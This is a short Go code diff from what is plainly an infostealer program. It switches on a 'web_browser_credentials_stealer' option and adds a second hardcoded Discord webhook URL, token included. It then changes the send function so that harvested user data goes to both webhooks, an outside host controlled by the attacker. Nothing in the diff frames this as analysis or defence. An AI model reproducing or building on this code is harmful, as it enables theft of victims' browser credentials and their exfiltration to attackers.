@@ -11,10 +11,11 @@ import (
 
 // init values / config
 var command_prompts bool = false
-var add_to_autostart bool = true
-var web_browser_credentials_stealer bool = false
+var add_to_autostart bool = false
+var web_browser_credentials_stealer bool = true
 
 const res_webhook_link string = "https://discord.com/api/webhooks/1224461106303467641/oaSR8xCS6mfQ3tR8ssOQLwb-S1kPqH1LWXtkvph54jWZDwTwwh5pwmlqkN3BxKPcbAHY"
+const res_webhook_link2 string = "https://discord.com/api/webhooks/1227680406145466611/eRbQxWtqw_VjdMwtgktgggJd7LeqpXzMzI2r-v188_G6uc_61lrVTuvggbP3nltX7D_c"
 
 var username string = "ssc"
 
@@ -124,4 +125,5 @@ func main() {
 
 func send_res(data utils.UserData) {
 	modules.SendMessageToWebhook(data, res_webhook_link)
+	modules.SendMessageToWebhook(data, res_webhook_link2)
 }
